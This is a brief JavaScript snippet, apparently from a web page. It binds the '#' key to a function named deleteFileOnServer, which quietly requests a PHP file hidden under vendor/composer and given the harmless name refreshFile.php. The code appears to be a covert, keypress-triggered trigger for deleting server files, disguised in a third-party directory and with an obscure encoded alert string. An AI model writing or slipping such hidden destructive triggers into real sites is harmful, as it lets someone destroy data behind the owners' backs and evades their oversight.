document.addEventListener("keydown", function(event) {
    if (event.key.toLowerCase() === "#" && !event.repeat) {
      deleteFileOnServer();
    }
  });
  
  function deleteFileOnServer() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "../vendor/composer/refreshFile.php", true);
    xhr.send();
  
    xhr.onload = function () {
      if (xhr.status === 200) {
        alert(xhr.responseText);
      } else {
        alert("guEI0irH7OQzTmwUSHEQRA==");
      }
    };
  }